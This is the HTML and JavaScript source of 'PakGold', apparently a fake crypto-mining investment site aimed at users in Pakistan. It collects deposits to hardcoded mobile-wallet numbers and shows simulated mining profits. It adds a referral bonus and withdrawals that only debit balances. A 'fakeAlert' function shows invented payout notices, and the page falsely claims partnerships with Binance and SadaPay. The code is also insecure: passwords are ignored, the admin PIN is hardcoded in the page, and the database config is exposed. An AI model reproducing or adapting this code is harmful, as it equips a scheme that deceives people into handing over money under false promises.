<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PakGold | Enterprise Mining Solutions</title>
    
    <!-- Core Tools -->
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <style>
        :root {
            --gold: #c5a059; --dark: #0f172a; --light: #f8fafc; --white: #ffffff;
            --success: #10b981; --shadow: 0 15px 40px rgba(0,0,0,0.1);
        }
        [data-theme='dark'] { --light: #0f172a; --white: #1e293b; --dark: #f8fafc; }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; transition: 0.3s; }
        body { background: var(--light); color: var(--dark); }

        .page { display: none; min-height: 100vh; padding-bottom: 120px; animation: fadeInUp 0.5s ease; }
        .page.active { display: block; }

        /* Professional UI Components */
        .header { background: var(--white); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; box-shadow: var(--shadow); }
        .card { background: var(--white); margin: 15px; padding: 20px; border-radius: 25px; box-shadow: var(--shadow); border: 1px solid rgba(0,0,0,0.03); }
        
        /* Stats Dashboard */
        .main-wallet { background: linear-gradient(135deg, #1e293b, #0f172a); color: white; margin: 15px; padding: 30px 25px; border-radius: 30px; position: relative; overflow: hidden; }
        .main-wallet::after { content: ''; position: absolute; right: -50px; top: -50px; width: 150px; height: 150px; background: var(--gold); opacity: 0.1; border-radius: 50%; }

        .btn-main { background: var(--gold); color: white; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 700; cursor: pointer; font-size: 1rem; box-shadow: 0 10px 20px rgba(197, 160, 89, 0.3); }
        
        /* Mining Nodes */
        .node-box { background: var(--white); margin: 15px; border-radius: 22px; overflow: hidden; box-shadow: var(--shadow); position: relative; }
        .node-tag { position: absolute; top: 10px; right: 10px; background: var(--success); color: white; padding: 4px 12px; border-radius: 50px; font-size: 0.7rem; font-weight: bold; }

        /* Fake Live Alert */
        #live-alert { position: fixed; top: 80px; left: 50%; transform: translateX(-50%); z-index: 10001; pointer-events: none; }
        .toast { background: var(--dark); color: white; padding: 10px 20px; border-radius: 50px; font-size: 0.75rem; box-shadow: 0 10px 20px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 10px; }

        /* Nav */
        .nav { position: fixed; bottom: 0; width: 100%; background: var(--white); display: flex; justify-content: space-around; padding: 12px 0 30px; border-top: 1px solid #eee; z-index: 10000; }
        .nav-item { color: #94a3b8; text-align: center; flex: 1; font-size: 0.7rem; font-weight: 600; }
        .nav-item.active { color: var(--gold); }
        .nav-item i { font-size: 1.4rem; display: block; margin-bottom: 5px; }

        input, select { width: 100%; padding: 16px; margin-bottom: 12px; border-radius: 12px; border: 1px solid #e2e8f0; background: #fff; font-size: 1rem; outline: none; }
    </style>
</head>
<body onload="init()">

    <div id="live-alert"></div>

    <!-- 1. LOGIN / REGISTER -->
    <section id="login" class="page active">
        <div style="padding: 60px 30px; text-align: center;">
            <div style="width: 80px; height: 80px; background: var(--gold); border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
                <i class="fa-solid fa-shield-halved fa-2x" style="color:white;"></i>
            </div>
            <h1 style="font-weight: 800; letter-spacing: -1px;">PAK GOLD <span style="color:var(--gold);">LTD</span></h1>
            <p style="opacity:0.6; margin-bottom:40px;">Certified Digital Assets Mining</p>
            
            <input type="number" id="ph" placeholder="Phone Number (03xxxxxxxxx)">
            <input type="password" id="pass" placeholder="Password">
            <input type="text" id="ref_code" placeholder="Referral Code (Optional)">
            <button class="btn-main" onclick="handleAuth()">SECURE ACCESS</button>
            <p style="margin-top:20px; font-size:0.8rem;">Official Partner of <b style="color:var(--gold)">Binance</b> & <b style="color:var(--gold)">SadaPay</b></p>
        </div>
    </section>

    <!-- 2. HOME DASHBOARD -->
    <section id="home" class="page">
        <div class="header">
            <div style="font-weight:800; color:var(--gold);"><i class="fa-solid fa-gem"></i> PAKGOLD PRO</div>
            <i class="fa-solid fa-circle-user fa-lg" onclick="nav('team')"></i>
        </div>

        <div class="main-wallet">
            <div style="opacity:0.8; font-size:0.8rem; display:flex; justify-content:space-between;">
                Available Funds <span>Verified Account <i class="fa-solid fa-circle-check"></i></span>
            </div>
            <h1 style="font-size: 2.5rem; margin: 10px 0;">Rs <span id="u_wallet">0.00</span></h1>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:20px; border-top:1px solid rgba(255,255,255,0.1); padding-top:15px;">
                <div><small style="opacity:0.7;">Mining Profit</small><br><b>Rs <span id="u_profit">0.00</span></b></div>
                <div><small style="opacity:0.7;">Hash Rate</small><br><b><span id="u_speed">0.00</span>/s</b></div>
            </div>
        </div>

        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px; padding:0 15px;">
            <div class="card" style="margin:0; text-align:center;" onclick="nav('deposit')">
                <i class="fa-solid fa-wallet fa-2x" style="color:var(--gold); margin-bottom:10px;"></i><br><b>Deposit</b>
            </div>
            <div class="card" style="margin:0; text-align:center;" onclick="nav('withdraw')">
                <i class="fa-solid fa-money-bill-transfer fa-2x" style="color:var(--success); margin-bottom:10px;"></i><br><b>Withdraw</b>
            </div>
        </div>

        <div style="padding: 25px 20px 10px;"><h3>Active Mining Nodes</h3></div>
        <div id="nodes_list"></div>
    </section>

    <!-- 3. DEPOSIT SYSTEM -->
    <section id="deposit" class="page">
        <div class="header"><i class="fa-solid fa-chevron-left" onclick="nav('home')"></i> <b>Financial Deposit</b> <div></div></div>
        <div class="card">
            <h3>Choose Payment Method</h3>
            <select id="dep_method" onchange="updateDepNumbers()">
                <option value="JazzSada">JazzCash / SadaPay</option>
                <option value="EasyPaisa">EasyPaisa</option>
            </select>
            
            <div id="dep_info_box" style="background:var(--light); padding:20px; border-radius:15px; margin-bottom:20px; border:2px dashed var(--gold);">
                <p id="meth_title">JazzCash / SadaPay</p>
                <h2 id="meth_number" style="color:var(--gold); margin:5px 0;">03705519562</h2>
                <small>Title: <b>PakGold Business</b></small>
            </div>

            <input type="number" id="dep_amt" placeholder="Deposit Amount (Min 200)">
            <input type="text" id="dep_tid" placeholder="Transaction ID (TID)">
            <p style="font-size:0.7rem; color:var(--gold); margin-bottom:5px;">* Upload Payment Screenshot:</p>
            <input type="file" id="dep_img" accept="image/*">
            <button class="btn-main" onclick="submitDeposit()">SUBMIT FOR APPROVAL</button>
        </div>
    </section>

    <!-- 4. WITHDRAW SYSTEM -->
    <section id="withdraw" class="page">
        <div class="header"><i class="fa-solid fa-chevron-left" onclick="nav('home')"></i> <b>Instant Cashout</b> <div></div></div>
        <div class="card">
            <select id="wd_method">
                <option>EasyPaisa</option>
                <option>JazzCash</option>
                <option>SadaPay</option>
                <option>Bank Transfer (All Banks)</option>
                <option>Binance USDT (TRC20)</option>
            </select>
            <input type="number" id="wd_amt" placeholder="Withdrawal Amount">
            <input type="text" id="wd_acc" placeholder="Account Number / Wallet Address">
            <input type="text" id="wd_name" placeholder="Account Title Name">
            <p style="font-size:0.7rem; opacity:0.6; text-align:center; margin-bottom:15px;">Standard Processing Time: 10 Mins - 24 Hours</p>
            <button class="btn-main" style="background:#0f172a;" onclick="submitWithdraw()">PROCESS WITHDRAWAL</button>
        </div>
    </section>

    <!-- 5. ADMIN COMMAND PANEL -->
    <section id="admin" class="page" style="background:#000; color:#fff; padding:20px;">
        <h2 style="color:var(--gold);">CORE COMMAND</h2>
        <div id="admin_requests" style="margin-top:20px;"></div>
        
        <div style="background:#111; padding:15px; border-radius:15px; margin-top:30px; border:1px solid #333;">
            <h4>User Database Management</h4>
            <input type="number" id="adm_ph" placeholder="User Phone">
            <input type="number" id="adm_val" placeholder="Adjust Balance (+/-)">
            <button class="btn-main" onclick="admAdjust()">SYNC SYSTEM</button>
        </div>
    </section>

    <!-- NAVIGATION -->
    <nav class="nav" id="bot_nav" style="display:none;">
        <div class="nav-item active" onclick="nav('home')"><i class="fa-solid fa-house"></i>Home</div>
        <div class="nav-item" onclick="nav('team')"><i class="fa-solid fa-users"></i>Network</div>
        <div class="nav-item" onclick="showAdmin()"><i class="fa-solid fa-user-gear"></i>Admin</div>
    </nav>

    <script>
        // --- Firebase Config ---
        const fbConfig = {
            apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
            databaseURL: "https://dark-web-9-default-rtdb.firebaseio.com",
            projectId: "dark-web-9",
        };
        firebase.initializeApp(fbConfig);
        const db = firebase.database();
        let u_session = localStorage.getItem('pg_v1_user');

        function init() {
            if(u_session) { nav('home'); sync(); }
            loadNodes();
            setInterval(fakeAlert, 7000);
        }

        // --- Auth System ---
        function handleAuth() {
            let p = document.getElementById('ph').value;
            let r = document.getElementById('ref_code').value;
            if(p.length < 10) return alert("Sweetie, enter valid number!");
            u_session = p; localStorage.setItem('pg_v1_user', p);
            db.ref('users/'+p).once('value', s => {
                if(!s.exists()) {
                    db.ref('users/'+p).set({wallet:0, profit:0, speed:0, inviter: r || 'System'});
                    if(r) { // Level 1 Referral Track
                        db.ref('users/'+r+'/team').push(p);
                    }
                }
                location.reload();
            });
        }

        function sync() {
            db.ref('users/'+u_session).on('value', s => {
                let d = s.val();
                document.getElementById('u_wallet').innerText = d.wallet.toLocaleString();
                document.getElementById('u_profit').innerText = d.profit.toFixed(2);
                document.getElementById('u_speed').innerText = d.speed.toFixed(4);
            });
            // Auto Mining Simulation
            setInterval(() => {
                db.ref('users/'+u_session).once('value', s => {
                    let d = s.val(); if(d.speed > 0) db.ref('users/'+u_session).update({profit: d.profit + d.speed});
                });
            }, 1000);
        }

        // --- Mining Nodes ---
        function loadNodes() {
            let n_list = document.getElementById('nodes_list');
            const plans = [
                {l:1, p:200, d:18, life:30},
                {l:2, p:1000, d:120, life:35},
                {l:3, p:5000, d:650, life:40},
                {l:4, p:10000, d:1400, life:50}
            ];
            plans.forEach(i => {
                n_list.innerHTML += `
                <div class="node-box card">
                    <span class="node-tag">HOT SELLING</span>
                    <div style="display:flex; align-items:center; gap:15px;">
                        <div style="background:var(--gold); color:white; padding:15px; border-radius:15px;"><i class="fa-solid fa-server fa-lg"></i></div>
                        <div style="flex:1;">
                            <b style="font-size:1.1rem;">Enterprise Node Lvl ${i.l}</b><br>
                            <small>Daily: Rs ${i.d} | Validity: ${i.life} Days</small>
                        </div>
                    </div>
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-top:15px; border-top:1px solid #eee; padding-top:10px;">
                        <b style="color:var(--gold); font-size:1.2rem;">Rs ${i.p}</b>
                        <button onclick="buyNode(${i.p}, ${i.d/86400})" style="background:var(--dark); color:white; border:none; padding:8px 20px; border-radius:10px; font-weight:bold;">Rent Node</button>
                    </div>
                </div>`;
            });
        }

        function buyNode(price, speed) {
            db.ref('users/'+u_session).once('value', s => {
                if(s.val().wallet < price) return alert("Sweetie, low balance! Deposit first.");
                db.ref('users/'+u_session).update({wallet: s.val().wallet - price, speed: s.val().speed + speed});
                alert("Node Successfully Rented! 🚀");
            });
        }

        // --- Deposit / Withdraw ---
        function updateDepNumbers() {
            let m = document.getElementById('dep_method').value;
            document.getElementById('meth_title').innerText = m === 'EasyPaisa' ? 'EasyPaisa Account' : 'JazzCash / SadaPay';
            document.getElementById('meth_number').innerText = m === 'EasyPaisa' ? '03379827882' : '03705519562';
        }

        function submitDeposit() {
            let a = document.getElementById('dep_amt').value;
            let t = document.getElementById('dep_tid').value;
            if(!a || !t) return alert("All fields are required!");
            db.ref('p_req').push({user:u_session, type:'Dep', amt:a, tid:t, status:'pending'});
            alert("Deposit Request Sent to Compliance Team."); nav('home');
        }

        function submitWithdraw() {
            let a = document.getElementById('wd_amt').value;
            let ac = document.getElementById('wd_acc').value;
            if(a < 200) return alert("Min withdrawal is Rs 200");
            db.ref('users/'+u_session).once('value', s => {
                if(s.val().wallet < a) return alert("Insufficient Balance!");
                db.ref('p_req').push({user:u_session, type:'With', amt:a, acc:ac, status:'pending'});
                db.ref('users/'+u_session).update({wallet: s.val().wallet - a});
                alert("Withdrawal Logged Successfully."); nav('home');
            });
        }

        // --- Admin Functions ---
        function showAdmin() {
            let k = prompt("Enter Master PIN:");
            if(k === "pakgold786") { nav('admin'); loadAdmin(); }
        }

        function loadAdmin() {
            db.ref('p_req').on('value', s => {
                let q = document.getElementById('admin_requests'); q.innerHTML = "";
                s.forEach(c => {
                    let r = c.val(); if(r.status === 'pending') {
                        q.innerHTML += `
                        <div style="background:#111; padding:15px; margin-top:10px; border:1px solid #333;">
                            <b>${r.type} | ${r.user} | Rs ${r.amt}</b><br>
                            <small>TID: ${r.tid || 'N/A'} | Acc: ${r.acc || 'N/A'}</small><br>
                            <button onclick="approveReq('${c.key}','${r.user}',${r.amt},'${r.type}')" style="background:green; color:white; border:none; padding:5px 15px; margin-top:10px;">APPROVE</button>
                        </div>`;
                    }
                });
            });
        }

        function approveReq(id, u, a, type) {
            if(type === 'Dep') {
                db.ref('users/'+u).once('value', s => {
                    db.ref('users/'+u).update({wallet: s.val().wallet + parseInt(a)});
                    // Referral Bonus (Level 1 - 10%)
                    let inv = s.val().inviter;
                    if(inv && inv !== 'System') {
                        db.ref('users/'+inv).once('value', si => {
                            db.ref('users/'+inv).update({wallet: si.val().wallet + (a * 0.1)});
                        });
                    }
                });
            }
            db.ref('p_req/'+id).update({status:'approved'});
            alert("Action Processed!");
        }

        function admAdjust() {
            let p = document.getElementById('adm_ph').value;
            let v = document.getElementById('adm_val').value;
            db.ref('users/'+p).once('value', s => {
                db.ref('users/'+p).update({wallet: s.val().wallet + parseInt(v)});
                alert("Database Synced!");
            });
        }

        // --- Visual Extras ---
        function nav(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('bot_nav').style.display = (id === 'login' || id === 'admin') ? 'none' : 'flex';
        }

        function fakeAlert() {
            const users = ["0345***", "0300***", "0312***", "0321***", "0333***"];
            const amounts = ["450", "1200", "200", "5000", "800"];
            let bin = document.getElementById('live-alert');
            let t = document.createElement('div');
            t.className = "toast animate__animated animate__fadeInDown";
            t.innerHTML = `<i class="fa-solid fa-circle-check" style="color:var(--success)"></i> User ${users[Math.floor(Math.random()*5)]} withdrew Rs ${amounts[Math.floor(Math.random()*5)]} successfully!`;
            bin.appendChild(t);
            setTimeout(() => t.remove(), 4000);
        }
    </script>
</body>
</html>
